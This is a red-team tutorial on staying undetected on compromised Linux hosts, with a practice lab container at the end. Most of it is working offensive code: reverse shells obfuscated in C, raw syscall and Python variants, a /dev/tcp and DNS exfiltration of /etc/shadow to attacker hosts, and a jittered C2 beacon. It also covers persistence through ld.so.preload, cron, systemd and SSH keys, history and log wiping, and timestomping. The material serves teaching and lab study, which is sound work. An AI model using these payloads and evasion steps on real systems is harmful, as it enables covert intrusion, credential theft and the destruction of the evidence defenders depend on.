Evasion

Avoiding detection at every stage - AV/ EDR evasion for executables, Linux process masquerading, fileless execution, auditd bypass, network traffic obfuscation, and living off the land.

Overview

Evasion is the practice of staying below the threshold of the sensors running on the same host you are operating on. This article covers Linux process masquerading, in-memory execution, auditd gaps, network covert channels, log tampering, and living-off-the-land techniques, and pairs each technique with the detection signal it is designed to avoid.

The Evasion Mindset

Evasion is not a checkbox - it is a continuous feedback loop applied to every action you take on a compromised system. Every process you spawn, every file you write to disk, every network connection you establish, and every command you execute is potentially observed. The defender's sensors are on the same system you're operating on. Your job is to understand those sensors and find the gaps between them.

Defense-in-depth means multiple overlapping detection layers. You evade by exploiting the seams between them:

Detection Layer Seam to Exploit
Signature-based AV Modify binary
Heuristic AV/EDR Change behavior
Userland API hooks Direct syscalls
Kernel callbacks Syscall fuzzing
ETW (Event Tracing) Patch ETW
AMSI (Antimalware Scan) Force failure
PowerShell logging Unmanaged PS
Auditd (Linux) Avoid execve
Network IDS Encapsulate
SIEM correlation Low-and-slow

The golden rule of evasion: The more like normal system behavior your actions appear, the less alerting they generate. Every deviation from baseline is a detection opportunity for the defender.

Linux Process Evasion

Understanding What Defenders See

When you execute a command on Linux, multiple logging systems capture evidence:

# auditd logs execve syscalls:
# type=SYSCALL msg=audit(1624320000.123:456): arch=c000003e syscall=59
#   success=yes exit=0 a0=7f... a1=7f... a2=7f... a3=0 items=2
#   ppid=1234 pid=5678 auid=1000 uid=0 gid=0 euid=0 suid=0 ...

# bash history records the command text:
# ~/.bash_history: nc -lvnp 4444

# /proc/PID/cmdline records argv (null-separated):
cat /proc/5678/cmdline | tr '\0' ' '
# /usr/bin/nc -lvnp 4444

# /proc/PID/exe symlinks to the binary:
readlink /proc/5678/exe
# /usr/bin/nc

Each mechanism leaves a different forensic trace. Evasion means controlling each independently

  • you don't need to defeat all of them, just the ones the defenders actively monitor.

Process Masquerading - argv

The first element in argv is argv[0] , the name a process reports to ps , top , and /proc/PID/cmdline . Before calling execve , a program can rewrite argv[0] to anything it likes, so the name shown to defenders is fully attacker-controlled.

# exec -a: execute a program with a custom argv[0]
exec -a "[kworker/u8:2]" /usr/bin/nc -lvnp 4444

# Verify what shows in ps:
ps aux | grep kworker
# Shows "[kworker/u8:2]" — appears as a kernel thread at a glance

# The real /proc/PID/exe still points to /usr/bin/nc:
readlink /proc/$(pgrep -f "nc -lvnp")/exe

# Overwrite cmdline after execution for full coverage:
python3 -c "
import os
pid = $(pgrep -f 'nc -lvnp')
with open(f'/proc/{pid}/cmdline', 'wb') as f:
    f.write(b'systemd-journald\x00')
"
# shell-initiated processes can overwrite their own /proc/PID/cmdline
# if run as root or the same UID

syscall-Level Process Masquerading

In C, manipulate argv before exec to control what appears in process listings:

// masquerade_exec.c — Spawn a process with arbitrary argv[0]
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <fake_name> <program> [args...]\n", argv[0]);
        return 1;
    }

    char *fake_name = argv[1];
    char *program   = argv[2];
    char **prog_args = &argv[2];

    // Overwrite argv[2] (the program path) with the fake name
    // The kernel copies argv from execve directly into /proc/PID/cmdline
    prog_args[0] = fake_name;

    execvp(program, prog_args);
    perror("execvp");
    return 1;
}
						
gcc -o masquerade_exec masquerade_exec.c
./masquerade_exec '[kworker/u8:5]' /usr/bin/ncat -lvnp 4444
# ps shows: [kworker/u8:5] -lvnp 4444

PPID Spoofing

Defenders trace parent-child process relationships. A shell spawning a network listener is suspicious. A process that is a child of init (PID 1) is less notable - many system services are reparented to init.

# Double fork — the intermediate parent exits, child becomes orphan:
(
    /usr/bin/nc -lvnp 4444 &
    CHILD_PID=$!
    disown $CHILD_PID
    # The subshell exits, init adopts the child
    # ppid of nc becomes 1 (systemd/init)
)

# Simpler orphan:
( /usr/bin/nc -lvnp 4444 & )
# Parent shell exits; nc reparented to init

Fileless Execution on Linux

Fileless execution means running code without writing an executable file to disk. This defeats file-based AV scanning, leaves no executable artifact on the filesystem, and avoids auditd's file creation logs.

memfd_create - Anonymous In-Memory Files

The memfd_create syscall (Linux 3.17+) creates an anonymous file backed by RAM. It has a name visible in /proc/PID/fd/ but no corresponding inode on any filesystem. fexecve executes a file descriptor; glibc 2.27 and later implement it with the execveat syscall, which the kernel added in Linux 3.19.

// memfd_exec.c — Execute an ELF binary from memory
// Build: gcc -o memfd_exec memfd_exec.c
// Usage: ./memfd_exec <elf_binary_path> [fake_proc_name] [args...]

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

static int memfd_create_wrapper(const char *name, unsigned int flags) {
    return syscall(SYS_memfd_create, name, flags);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <executable> [fake_proc_name] [args...]\n", argv[0]);
        return 1;
    }

    // Read the ELF into memory
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct stat st;
    fstat(fd, &st);
    unsigned char *elf_data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);

    if (elf_data == MAP_FAILED) { perror("mmap"); return 1; }

    // Create anonymous in-memory file
    int memfd = memfd_create_wrapper("", MFD_CLOEXEC);
    if (memfd < 0) { perror("memfd_create"); return 1; }

    // Write ELF to the anonymous file
    if (write(memfd, elf_data, st.st_size) != st.st_size) {
        perror("write"); return 1;
    }

    // Prepare args for fexecve
    char **exec_args = &argv[2];  // argv[2] becomes argv[0] for new process
    fexecve(memfd, exec_args, NULL);
    perror("fexecve");
    return 1;
}
						
gcc -o memfd_exec memfd_exec.c

# Execute a reverse shell from memory with fake process name:
./memfd_exec /tmp/reverse_shell "[kjournald]" "[kjournald]"

# The binary never touches the filesystem after initial read
# /proc/PID/exe → /memfd: (deleted)
# No auditd file creation event for the execution

/dev/shm Execution

/dev/shm is a tmpfs (RAM-backed filesystem). Files written here never touch disk. Many EDR s scan /tmp and /var/tmp but skip /dev/shm .

# Copy binary to /dev/shm and execute:
cp /tmp/reverse_shell /dev/shm/.cache_update
chmod +x /dev/shm/.cache_update
/dev/shm/.cache_update &

# Verify it's running from RAM:
ls -la /proc/$(pgrep cache_update)/exe
# → /dev/shm/.cache_update (deleted)  [after unlinking]

# Unlink after execution to remove the filename entry:
rm /dev/shm/.cache_update
# Process continues running; the inode is held open by the process

DDexec Self-Overwriting Execution

DDexec overwrites its own process memory with a new ELF binary, then transfers control to it

  • no new process, no execve syscall, no /proc entry for a new process.

wget https://raw.githubusercontent.com/arget13/DDexec/main/dd-exec.sh
chmod +x dd-exec.sh

# Execute a binary entirely in memory (self-overwrite):
./dd-exec.sh -p $(cat /proc/self/stat | awk '{print $1}') -b /tmp/reverse_shell

# The dd-exec process transforms into reverse_shell in-place.
# auditd sees: dd-exec.sh started → dd-exec.sh still running
# No execve event, no new PID.

AV/EDR Evasion for Linux Binaries

What Triggers Detection

Detection Method What It Matches On Evasion Technique
Byte signature Static byte sequence (hash/fuzzy) Modify instructions, reorder code, add NOPs
String signature Known strings ("reverse shell") XOR encrypt strings, compile-time obfuscation
Import table Library function usage pattern Static linking, raw syscalls
Heuristics socket->connect->dup2->execve sequence Split across functions, delayed execution
Entropy High-entropy sections (encrypted payloads) Add low-entropy filler
YARA rules Complex pattern matching Identify rules, break patterns

Step 1: Split Heuristic Pattern

Starting from a naive reverse shell:

// naive_revshell.c — detected by any heuristic AV
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(void) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in remote_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(4444)
    };
    inet_pton(AF_INET, "10.0.0.100", &remote_addr.sin_addr);
    connect(sockfd, (struct sockaddr *)&remote_addr, sizeof(remote_addr));
    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}

Refactored to break the sequential API pattern:

// split_revshell.c — API calls scattered across functions
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

// Decoy function — adds noise to call graph analysis
__attribute__((noinline))
static int do_noise(void) {
    volatile int x = 0;
    for (int i = 0; i < 50; i++) x += (i * 7) % 13;
    return x;
}

__attribute__((noinline))
static int make_socket(void) {
    do_noise();
    return socket(AF_INET, SOCK_STREAM, 0);
}

__attribute__((noinline))
static void do_connect(int sockfd, const char *ip, unsigned short port) {
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(port) };
    inet_pton(AF_INET, ip, &addr.sin_addr);
    do_noise();
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    do_noise();
}

__attribute__((noinline))
static void redirect_stdio(int sockfd) {
    do_noise();
    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);
}

__attribute__((noinline))
static void launch_shell(void) {
    do_noise();
    execve("/bin/sh", NULL, NULL);
}

int main(void) {
    int fd = make_socket();
    do_connect(fd, "10.0.0.100", 4444);
    redirect_stdio(fd);
    launch_shell();
    return 0;
}

The noinline attribute forces each function to appear individually in the binary, breaking the linear call-graph signature.

Step 2: Compile-Time String Obfuscation

// str_obfuscated_revshell.c — Strings encrypted at rest in the binary
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

// XOR key — change per compilation to rotate signatures
#define XKEY 0x7D

// XOR-encrypted "/bin/sh"
static char binsh[] = {
    0x53 ^ XKEY, 0x53 ^ XKEY, 0x0E ^ XKEY, 0x16 ^ XKEY,
    0x19 ^ XKEY, 0x53 ^ XKEY, 0x0C ^ XKEY, 0x15 ^ XKEY, 0x00 ^ XKEY
};

static void str_decrypt(char *buf, size_t len, char key) {
    for (size_t i = 0; i < len; i++) buf[i] ^= key;
}

int main(void) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(4444) };
    inet_pton(AF_INET, "10.0.0.100", &addr.sin_addr);
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);

    str_decrypt(binsh, sizeof(binsh), XKEY);
    execve(binsh, NULL, NULL);
    return 0;
}
						
gcc -O2 -s -fvisibility=hidden -fno-stack-protector \
    -o revshell_obf str_obfuscated_revshell.c
strip --strip-all revshell_obf

Step 3: Raw Syscalls

EDR s hook libc functions via LD_PRELOAD or ptrace. Direct syscalls in inline assembly bypass these hooks entirely because they never call the hooked libc wrapper.

// raw_syscall_revshell.c — Zero libc networking calls
#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>

static long sys(long n, long a1, long a2, long a3, long a4, long a5, long a6) {
    register long r10 asm("r10") = a4;
    register long r8  asm("r8")  = a5;
    register long r9  asm("r9")  = a6;
    long ret;
    asm volatile("syscall"
        : "=a"(ret)
        : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9)
        : "rcx", "r11", "memory");
    return ret;
}

struct sin {
    unsigned short family;   // sin_family
    unsigned short port;     // sin_port
    unsigned int   addr;     // sin_addr.s_addr
    unsigned char  zero[8];
};

int _start(void) {
    // socket(AF_INET=2, SOCK_STREAM=1, 0)
    long fd = sys(SYS_socket, 2, 1, 0, 0, 0, 0);
    if (fd < 0) { sys(SYS_exit, 1, 0, 0, 0, 0, 0); }

    // 10.0.0.100:4444 — pre-computed network byte order
    struct sin addr = {
        .family = 2,          // AF_INET
        .port   = 0x5c11,     // htons(4444) = 0x115c → 0x5c11
        .addr   = 0x6400000a  // inet_addr("10.0.0.100") = 0x0a000064 → little-endian 0x6400000a
    };

    sys(SYS_connect, fd, (long)&addr, 16, 0, 0, 0);

    // dup2 to redirect stdin/out/err
    sys(SYS_dup2, fd, 0, 0, 0, 0, 0);
    sys(SYS_dup2, fd, 1, 0, 0, 0, 0);
    sys(SYS_dup2, fd, 2, 0, 0, 0, 0);

    // execve("/bin//sh", NULL, NULL) — double slash for 8-byte alignment
    char path[] = "/bin//sh";
    sys(SYS_execve, (long)path, 0, 0, 0, 0, 0);

    sys(SYS_exit, 0, 0, 0, 0, 0, 0);
}
						
# Compile as fully standalone ELF (no libc, no dynamic linker):
gcc -nostdlib -static -O2 -s \
    -Wl,--entry=_start \
    -o revshell_raw raw_syscall_revshell.c

# Verify no shared library dependencies:
ldd revshell_raw
# → "not a dynamic executable"

# Size: ~5 KB — entirely self-contained
ls -la revshell_raw

# This binary makes zero libc calls. LD_PRELOAD hooks have no effect.
# EDRs that hook libc functions see nothing from this process.

Step 4: Append Junk

# Append random data beyond ELF segment boundaries:
dd if=/dev/urandom bs=1024 count=10 >> revshell_raw

# The appended data is beyond LOAD segment boundaries — ignored by the loader,
# but changes the file hash and disrupts whole-file signature matching.

# Verify the binary still runs:
./revshell_raw
# Works identically

Linux auditd Evasion

auditd monitors syscalls based on configured rules. The most common rule sets monitor execve (process execution) and file access.

Understanding auditd Coverage

# List active audit rules:
auditctl -l

# Typical red-team-relevant rules:
# -a always,exit -F arch=b64 -S execve -k process_execution
# -a always,exit -F arch=b64 -S connect -k network_connect
# -a always,exit -F arch=b64 -S bind -k network_bind
# -a always,exit -F arch=b64 -S ptrace -k process_trace
# -w /etc/shadow -p rwa -k shadow_access
# -w /etc/passwd -p wa -k passwd_modify

Key insight: auditd rules are explicit. If a syscall is not listed, it is not audited. Many configurations cover execve (59) but forget execveat (322). The memfd_create + fexecve technique from earlier exploits this gap because fexecve internally calls the execveat syscall

  • not execve .

Alternative Execution Paths

# 1. Shared library injection via ld.so.preload:
echo "/dev/shm/libhook.so" >> /etc/ld.so.preload
# Every new process loads your library automatically
# No execve audit event for your code — it piggybacks on legitimate processes

# 2. Cron/at jobs — execution from cron context, not your shell:
echo "*/5 * * * * /dev/shm/.cache_update" | crontab -
# Parent process of execution: cron (PID varies)
# Not traceable to your interactive session

# 3. Systemd timer — even more legitimate-looking:
systemd-run --unit=syslog-cleanup --on-calendar='*:0/30' /dev/shm/.cache_update
# Appears as a system service with a descriptive name

# 4. SSH forced command — triggers on each SSH connection:
# Append to ~/.ssh/authorized_keys:
# command="/dev/shm/.cache_update" ssh-ed25519 AAAAC3...
# No shell history, no auditd trace to your PID

LD_PRELOAD Unhooking

If the Linux environment has EDR via LD_PRELOAD, strip it before execution:

# Check if LD_PRELOAD is active:
cat /proc/self/maps | grep -i preload

# Execute with clean environment:
env -i PATH=/usr/bin:/bin /bin/bash
# env -i: clear all environment variables
# The spawned shell has no LD_PRELOAD hooks

# Statically compiled binaries ignore LD_PRELOAD entirely
# because they don't use the dynamic linker — another reason to use -static

Network Evasion

C2 Beacon with Jitter

# Beacon that mimics legitimate REST API calls over HTTPS:
c2_token="$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 32)"
echo "$c2_token" > /tmp/beacon_token

while true; do
    sleep $((30 + RANDOM % 90))  # Jitter: 30-120 seconds

    curl -s -X POST "https://c2.example.com/api/v1/health" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -H "Authorization: Bearer $(cat /tmp/beacon_token)" \
        -d "{\"status\":\"ok\",\"host\":\"$(hostname)\",\"ts\":$(date +%s)}" \
        --connect-timeout 10 > /dev/null 2>&1
done &
# This blends with normal enterprise traffic: HTTPS, JSON, standard UA

DNS Exfiltration Chunked

# Exfiltrate a file through DNS A-record queries in small chunks:
exfiltrate_dns() {
    local file="$1" domain="$2"
    split -b 32 "$file" /tmp/dns_chunk_
    for chunk in /tmp/dns_chunk_*; do
        hex="$(xxd -p "$chunk" | tr -d '\n')"
        dig +short "${hex}.${domain}" A 2>/dev/null
        sleep $((2 + RANDOM % 5))
    done
    rm -f /tmp/dns_chunk_*
}

exfiltrate_dns /etc/shadow exfil.attacker.com
# Server-side: extract subdomains from DNS query logs, xxd -r -p to rebuild

Log Evasion

Shell History Manipulation

# Prevent history recording for a session:
unset HISTFILE
set +o history

# Delete last command from history:
history -d $((HISTCMD-1))

# Destroy history files:
shred -zu ~/.bash_history ~/.zsh_history ~/.mysql_history

# Make history immutable (root):
chattr +i ~/.bash_history

Truncating System Logs

# Wipe log files (leaves empty files — detectable):
: > /var/log/syslog
: > /var/log/auth.log
: > /var/log/audit/audit.log

# Selective log removal by timestamp (less detectable):
sed -i '/Jun 26 02:15:.*sshd.*authentication/d' /var/log/auth.log

# Wipe journal logs selectively:
journalctl --vacuum-time=1s   # Wipes all but last second
journalctl --rotate           # Rotate then delete old journals
rm -rf /var/log/journal/*

Timestomping

# Touch -t: set file timestamp to arbitrary date
# Format: [[CC]YY]MMDDhhmm[.ss]
touch -t 202401010000.00 /dev/shm/.cache_update

# Match timestamp of an existing legitimate file:
touch -r /usr/bin/ls /dev/shm/.cache_update

# Set all three timestamps (atime, mtime) to same reference:
touch -a -m -r /usr/bin/sshd /tmp/backdoor.sh
# atime: access time, mtime: modification time

Living Off the Land (LotL)

Using built-in system tools for operations avoids dropping custom binaries entirely.

# File transfer without wget/curl (using /dev/tcp):
exec 3<>/dev/tcp/10.0.0.100/4444
cat /etc/shadow >&3

# Download a file using base64 over DNS or HTTP:
curl -s http://10.0.0.100/payload.b64 | base64 -d > /dev/shm/.payload

# Python for reverse shell (often available on Linux servers):
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.100",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'

# Perl reverse shell:
perl -e 'use Socket;

Practical Evasion Workflow

A systematic approach to building an undetected payload:

# 1. Generate base payload with msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.100 LPORT=4444 \
    -f elf -o payload_raw.elf

# 2. Baseline detection — test against ClamAV
clamscan payload_raw.elf
# Expected: detected (too many signatures)

# 3. Extract shellcode into C template
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.100 LPORT=4444 -f c

# 4. Embed shellcode in a custom loader with XOR obfuscation
# Apply the techniques from Step 2/3 above

# 5. Add junk sections
dd if=/dev/urandom bs=1024 count=20 >> payload_obf.elf

# 6. Compress with UPX (can work against some engines, but UPX is signatured itself)
upx payload_obf.elf -o payload_upx.elf  # May increase detections

# 7. Test iteratively
clamscan payload_obf.elf
# Repeat Steps 3-7, changing XOR key, function layout, junk size each iteration

# 8. Once undetected by ClamAV, test against your lab EDR (see Containerfile)
cp payload_obf.elf /tmp/

Challenge

The companion container simulates a monitored Linux host so you can measure each technique against a sensor instead of guessing.

evasion.Containerfile

The image provides:

  • auditd configured to monitor execve , connect , bind , ptrace syscalls
  • Python process monitor ( /opt/monitor.py ) that watches /proc for new processes, flags processes with:
  • Suspicious parent-child relationships (bash spawning nc)
  • Listening sockets from non-system paths
  • Execution from /dev/shm or /tmp
  • Logging to /var/log/edr-sim.log with timestamped alerts

The container includes gcc, python3, nasm, and other build tools for compiling and testing evasion payloads.

Lab objectives

  1. Compile a naive reverse shell. Run it. Observe the Python monitor flagging it.
  2. Apply process masquerading ( exec -a ). Re-run. Does the monitor still catch it?
  3. Compile the raw-syscall version. Does auditd still log the execve?
  4. Use fileless execution via /dev/shm with immediate unlink. Does the monitor detect the deleted binary?
  5. Write a custom Python shellcode loader that never calls execve. Compare auditd logs.
# Build the lab:
podman build -t evasion-lab -f evasion.Containerfile .

# Run with the capabilities auditd needs and a port for callback testing:
podman run -it --rm --name evasion-lab \
    --cap-add NET_ADMIN \
    --cap-add AUDIT_WRITE \
    --cap-add AUDIT_CONTROL \
    -p 4444:4444 \
    -v ./src:/src:Z \
    evasion-lab

# Inside the container - the monitor is already running:
cat /var/log/edr-sim.log                  # View alerts

# Compile and test the naive reverse shell:
cd /src
gcc -o naive_revshell naive_revshell.c
./naive_revshell &
# Check alerts:
tail /var/log/edr-sim.log

# Test raw syscall version:
gcc -nostdlib -static -O2 -s -Wl,--entry=_start \
    -o raw_revshell raw_syscall_revshell.c
./raw_revshell &
# Compare auditd logs:
ausearch -m SYSCALL -sv no | aureport -x --summary

# Test fileless Python shellcode:
python3 /src/python_shellcode_loader.py &
# The Python process never calls execve — auditd sees nothing
# But the process monitor may still flag the socket connection
